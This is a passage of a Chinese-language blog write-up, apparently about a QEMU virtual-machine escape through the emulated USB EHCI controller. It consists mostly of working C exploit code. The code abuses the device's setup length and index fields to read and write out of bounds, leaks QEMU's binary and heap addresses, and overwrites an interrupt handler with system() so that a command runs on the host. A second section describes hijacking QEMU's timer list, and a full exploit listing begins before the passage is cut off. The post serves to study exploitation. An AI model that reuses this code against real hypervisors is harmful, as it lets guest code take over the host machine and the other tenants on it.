class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PRESET       (1 &lt;&lt; 8)     <span class="hljs-comment">// Port Reset</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PORTSC_PED          (1 &lt;&lt; 2)     <span class="hljs-comment">// Port Enable/Disable</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_RUNSTOP      (1 &lt;&lt; 0)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USBCMD_PSE          (1 &lt;&lt; 4)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_OUT         0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_DIR_IN          0x80</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_ACTIVE    (1 &lt;&lt; 7)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_SETUP     2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_IN        1 <span class="hljs-comment">/* device -&gt; host */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> USB_TOKEN_OUT       0 <span class="hljs-comment">/* host -&gt; device */</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SETUP_STATE_DATA    2</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_TBYTES_SH 16</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> QTD_TOKEN_PID_SH    8</span><br><br><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br><br>    <span class="hljs-comment">/* endpoint characteristics */</span><br>    <span class="hljs-type">uint32_t</span> epchar;<br><br>    <span class="hljs-comment">/* endpoint capabilities */</span><br>    <span class="hljs-type">uint32_t</span> epcap;<br><br>    <span class="hljs-type">uint32_t</span> current_qtd;             <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> next_qtd;                <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext_qtd;<br><br>    <span class="hljs-type">uint32_t</span> token;                   <span class="hljs-comment">/* Same as QTD token */</span><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqh;<br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> &#123;</span><br>    <span class="hljs-type">uint32_t</span> next;                    <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> altnext;                 <span class="hljs-comment">/* Standard next link pointer */</span><br>    <span class="hljs-type">uint32_t</span> token;<br><br>    <span class="hljs-type">uint32_t</span> bufptr[<span class="hljs-number">5</span>];               <span class="hljs-comment">/* Standard buffer pointer */</span><br><br>&#125; EHCIqtd;<br><br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">page_offset</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> addr)</span><br>&#123;<br>    <span class="hljs-comment">// addr &amp; 0xfff</span><br>    <span class="hljs-keyword">return</span> addr &amp; ((<span class="hljs-number">1</span> &lt;&lt; PAGE_SHIFT) - <span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gfn</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> pme, gfn;<br>    <span class="hljs-type">size_t</span> offset;<br>    fd = open(<span class="hljs-string">&quot;/proc/self/pagemap&quot;</span>, O_RDONLY);<br>    <span class="hljs-keyword">if</span> (fd &lt; <span class="hljs-number">0</span>) &#123;<br>        perror(<span class="hljs-string">&quot;open&quot;</span>);<br>        <span class="hljs-built_in">exit</span>(<span class="hljs-number">1</span>);<br>    &#125;<br>    offset = ((<span class="hljs-type">uintptr_t</span>)addr &gt;&gt; <span class="hljs-number">9</span>) &amp; ~<span class="hljs-number">7</span>;<br>    lseek(fd, offset, SEEK_SET);<br>    read(fd, &amp;pme, <span class="hljs-number">8</span>);<br>    <span class="hljs-keyword">if</span> (!(pme &amp; PFN_PRESENT))<br>        <span class="hljs-keyword">return</span> <span class="hljs-number">-1</span>;<br><br>    gfn = pme &amp; PFN_PFN;<br>    close(fd);<br>    <span class="hljs-keyword">return</span> gfn;<br>&#125;<br><br><span class="hljs-type">uint64_t</span> <span class="hljs-title function_">gva_to_gpa</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span><br>&#123;<br>    <span class="hljs-type">uint64_t</span> gfn = gva_to_gfn(addr);<br>    assert(gfn != <span class="hljs-number">-1</span>);<br>    <span class="hljs-keyword">return</span> (gfn &lt;&lt; PAGE_SHIFT) | page_offset((<span class="hljs-type">uint64_t</span>)addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">mmio_write</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr, <span class="hljs-type">uint32_t</span> value)</span>&#123;<br>    *(<span class="hljs-type">uint32_t</span> *)(mmio + addr) = value;<br>&#125;<br><br><span class="hljs-type">uint32_t</span> <span class="hljs-title function_">mmio_read</span><span class="hljs-params">(<span class="hljs-type">uint64_t</span> addr)</span>&#123;<br>    <span class="hljs-keyword">return</span> *(<span class="hljs-type">uint32_t</span> *)(mmio + addr);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">set_length</span><span class="hljs-params">(<span class="hljs-type">uint16_t</span> len, <span class="hljs-type">uint8_t</span> option)</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_SETUP &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">8</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(setup_buf);<br><br>    setup_buf[<span class="hljs-number">0</span>] = option;<br>    <span class="hljs-comment">// setup_buf[2] = value &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[3] = (value &gt;&gt; 8 ) &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[4] = index &amp; 0xff;</span><br>    <span class="hljs-comment">// setup_buf[5] = (index &gt;&gt; 8 ) &amp; 0xff;</span><br>    setup_buf[<span class="hljs-number">6</span>] = len &amp; <span class="hljs-number">0xff</span>;<br>    setup_buf[<span class="hljs-number">7</span>] = (len &gt;&gt; <span class="hljs-number">8</span> ) &amp; <span class="hljs-number">0xff</span>;<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">read_from_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_IN &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">write_to_usb</span><span class="hljs-params">()</span>&#123;<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PRESET);<br>    mmio_write(<span class="hljs-number">0x64</span>, PORTSC_PED);<br>    sleep(<span class="hljs-number">1</span>);<br><br>    qh-&gt;token = QTD_TOKEN_ACTIVE;<br>    qh-&gt;current_qtd = gva_to_gpa(qtd);<br>    qtd-&gt;token = QTD_TOKEN_ACTIVE | USB_TOKEN_OUT &lt;&lt; QTD_TOKEN_PID_SH | <span class="hljs-number">0x2000</span> &lt;&lt; QTD_TOKEN_TBYTES_SH;<br>    qtd-&gt;bufptr[<span class="hljs-number">0</span>] = gva_to_gpa(data_buf);<br>    qtd-&gt;bufptr[<span class="hljs-number">1</span>] = gva_to_gpa(data_buf_oob);<br><br>    mmio_write(<span class="hljs-number">0x2c</span>, <span class="hljs-number">0</span>);<br>    mmio_write(<span class="hljs-number">0x34</span>, gva_to_gpa(buf));<br>    mmio_write(<span class="hljs-number">0x20</span>, USBCMD_RUNSTOP | USBCMD_PSE);<br>    sleep(<span class="hljs-number">1</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_read</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">uint32_t</span> size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_IN;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    read_from_usb();<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">arb_write</span><span class="hljs-params">(<span class="hljs-type">uint32_t</span> offset, <span class="hljs-type">void</span> *payload, <span class="hljs-type">uint32_t</span> payload_size)</span>&#123;<br>    set_length(<span class="hljs-number">0x100</span>, USB_DIR_IN);<br>    <span class="hljs-built_in">memset</span>(data_buf, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    <span class="hljs-built_in">memset</span>(data_buf_oob, <span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>);<br>    set_length(<span class="hljs-number">0x1010</span>, USB_DIR_OUT);<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">4</span>) = SETUP_STATE_DATA;  <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">8</span>) = <span class="hljs-number">0x1018</span>;            <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = ((<span class="hljs-type">size_t</span>)<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">32</span>)  - <span class="hljs-number">8</span>  - <span class="hljs-number">0x1010</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf) = USB_DIR_OUT;<br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0xc</span>) = SETUP_STATE_DATA; <span class="hljs-comment">//s-&gt;setup_state</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x10</span>) = offset + payload_size; <span class="hljs-comment">//s-&gt;setup_len</span><br>    *(<span class="hljs-type">uint32_t</span>*)(data_buf_oob + <span class="hljs-number">0x14</span>) = offset - <span class="hljs-number">0x1020</span>; <span class="hljs-comment">//s-&gt;setup_index</span><br>    write_to_usb();<br>    <span class="hljs-built_in">memcpy</span>(data_buf, payload, payload_size);<br>    <span class="hljs-comment">//getchar();</span><br>    write_to_usb();<br>&#125;<br><br><span class="hljs-type">char</span> cmd[<span class="hljs-number">0x40</span>] = <span class="hljs-string">&quot;gnome-calculator&quot;</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">int</span>  mmio_fd = open(<span class="hljs-string">&quot;/sys/devices/pci0000:00/0000:00:03.0/resource0&quot;</span>, O_RDWR | O_SYNC);<br>    mmio         = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x1000</span>, PROT_READ | PROT_WRITE, MAP_SHARED, mmio_fd, <span class="hljs-number">0</span>);<br>    buf = mmap(<span class="hljs-number">0</span>, <span class="hljs-number">0x3000</span>, PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    mlock(buf, <span class="hljs-number">0x3000</span>);<br><br>    entry = buf + <span class="hljs-number">4</span>;<br>    qh = buf + <span class="hljs-number">0x100</span>;<br>    qtd = buf + <span class="hljs-number">0x200</span>;<br>    setup_buf = buf + <span class="hljs-number">0x300</span>;<br>    payload_buf = buf + <span class="hljs-number">0x400</span>;<br>    data_buf = buf + <span class="hljs-number">0x1000</span>;<br>    data_buf_oob = buf + <span class="hljs-number">0x2000</span>;<br><br>    *entry = gva_to_gpa(qh) + <span class="hljs-number">2</span>;<br><br>    <span class="hljs-comment">// set_length(0x100, USB_DIR_IN);</span><br>    arb_read(<span class="hljs-number">0x2004</span>, <span class="hljs-number">0x40</span>);<br>    <span class="hljs-type">size_t</span> elf_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf + <span class="hljs-number">0x18</span>);<br>    <span class="hljs-type">size_t</span> elf_base_addr = elf_addr - <span class="hljs-number">0x538467</span>;<br>    <span class="hljs-type">size_t</span> system_plt = elf_base_addr + <span class="hljs-number">0x2c4940</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_elf_base_addr_is %#lx\n&quot;</span>, elf_base_addr);<br><br>    <span class="hljs-type">size_t</span> heap_addr = *(<span class="hljs-type">uint64_t</span>*)(data_buf);<br>    <span class="hljs-type">size_t</span> usb_device_addr = heap_addr - <span class="hljs-number">0x2050</span>;<br>    <span class="hljs-type">size_t</span> ehci_state_addr = usb_device_addr - <span class="hljs-number">0x83260</span>;<br>    <span class="hljs-type">size_t</span> usb_data_buf = usb_device_addr + <span class="hljs-number">0xdc</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;[*] leak_usb_device_addr_is %#lx\n&quot;</span>, usb_device_addr);<br><br>    <span class="hljs-type">size_t</span> irq_addr = usb_device_addr - <span class="hljs-number">0x7c0</span>;<br>    <br>    *payload_buf = system_plt;<br>    *(payload_buf + <span class="hljs-number">1</span>) = usb_data_buf;<br>    arb_write((<span class="hljs-type">uint32_t</span>)(irq_addr + <span class="hljs-number">0x28</span> - usb_data_buf), payload_buf, <span class="hljs-number">0x10</span>);<br><br>    set_length(<span class="hljs-number">0x40</span>, USB_DIR_OUT);<br>    <span class="hljs-built_in">memcpy</span>(data_buf, cmd, <span class="hljs-number">0x40</span>);<br>    write_to_usb();<br><br>    mmio_write(<span class="hljs-number">0x24</span>, <span class="hljs-number">0</span>);<br><br>&#125;<br></code></pre></td></tr></table></figure><p>​                                                            </p><h4 id="修改time-list"><a href="#修改time-list" class="headerlink" title="修改time_list"></a>修改time_list</h4><p>另一种就是参考CVE-2019-6778的做法，不依赖任何设备的函数，直接伪造QEMUTimerList和QEMUTimer，修改qemu的全局变量main_loop_tlg的值为伪造的QEMUTimerList的地址，等待QEMUTimer中的cb(opaque)去自动执行。</p><p>不过真的有必要去伪造一个QEMUTimerList吗？在<a href="https://elixir.bootlin.com/qemu/v4.2.1/source/util/qemu-timer.c#L557">timerlist_run_timers</a>函数中，ts &#x3D; timer_list-&gt;active_timers，最后再去调用ts这个QEMUTimer中的cb(opaque)，那么直接修改timer_list-&gt;active_timers为一个伪造的QEMUTimer地址依然可以达到目的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> ((ts = timer_list-&gt;active_timers)) &#123;<br>      <span class="hljs-keyword">if</span> (!timer_expired_ns(ts, current_time)) &#123;<br>          <span class="hljs-comment">/* No expired timers left.  The checkpoint can be skipped</span><br><span class="hljs-comment">           * if no timers fired or they were all external.</span><br><span class="hljs-comment">           */</span><br>          <span class="hljs-keyword">break</span>;<br>      &#125;<br>      <span class="hljs-keyword">if</span> (need_replay_checkpoint<br>              &amp;&amp; !(ts-&gt;attributes &amp; QEMU_TIMER_ATTR_EXTERNAL)) &#123;<br>          <span class="hljs-comment">/* once we got here, checkpoint clock only once */</span><br>          need_replay_checkpoint = <span class="hljs-literal">false</span>;<br>          qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>          <span class="hljs-keyword">if</span> (!replay_checkpoint(CHECKPOINT_CLOCK_VIRTUAL)) &#123;<br>              <span class="hljs-keyword">goto</span> out;<br>          &#125;<br>          qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br>          <span class="hljs-comment">/* The lock was released; start over again in case the list was</span><br><span class="hljs-comment">           * modified.</span><br><span class="hljs-comment">           */</span><br>          <span class="hljs-keyword">continue</span>;<br>      &#125;<br><br>      <span class="hljs-comment">/* remove timer from the list before calling the callback */</span><br>      timer_list-&gt;active_timers = ts-&gt;next;<br>      ts-&gt;next = <span class="hljs-literal">NULL</span>;<br>      ts-&gt;expire_time = <span class="hljs-number">-1</span>;<br>      cb = ts-&gt;cb;<br>      opaque = ts-&gt;opaque;<br><br>      <span class="hljs-comment">/* run the callback (the timer list can be modified) */</span><br>      qemu_mutex_unlock(&amp;timer_list-&gt;active_timers_lock);<br>      cb(opaque);<br>      qemu_mutex_lock(&amp;timer_list-&gt;active_timers_lock);<br><br>      progress = <span class="hljs-literal">true</span>;<br>  &#125;<br></code></pre></td></tr></table></figure><p>​                                              </p><p>完整exp：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">define</span> _GNU_SOURCE</span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdint.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;assert.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;inttypes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;fcntl.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/mman.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;sys/io.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;unistd.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdbool.h&gt;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SHIFT  12</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PAGE_SIZE   (1 &lt;&lt; PAGE_SHIFT)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PRESENT (1ull &lt;&lt; 63)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> PFN_PFN     ((1ull &lt;&lt; 55) - 1)</span><br><br><span class="hljs-type">void</span> *mmio;<br><span class="hljs-type">int</span> fd;<br><span class="hljs-type">void</span> *buf;<br><span class="hljs-type">uint8_t</span> *setup_buf;<br><span class="hljs-type">size_t</span> *payload_buf;<br><span class="hljs-type">void</span> *data_buf;<br><span class="hljs-type">void</span> *data_buf_oob;<br><span class="hljs-type">uint32_t</span> *entry;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqh</span> * <span class="hljs-title">qh</span>;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">EHCIqtd</span> * <span class="hljs-title">qtd</span>;</span><br><br><span class="hljs-meta">#<span 